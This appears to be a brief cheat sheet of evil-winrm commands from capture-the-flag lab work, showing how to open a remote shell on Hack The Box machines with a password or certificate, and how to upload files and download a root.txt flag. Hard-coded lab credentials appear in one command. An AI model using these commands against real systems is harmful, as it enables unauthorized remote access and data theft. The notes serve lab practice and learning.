#### establish a session
- evil-winrm -i 10.10.10.161 -u svc-alfresco' -p 's3rvice
#### upload a file
-  C:\Users\Administrator\Documents> upload /home/kimkhuongduy/Desktop/file.file C:\Users\svc-alfresco\Documents
#### Download a file
- C:\Users\Administrator\Documents> download C:\Users\svc-alfresco\Documents\root.txt
#### login
 - evil-winrm -i 10.10.11.152 -S -c crt.crt -k key.key -u -p
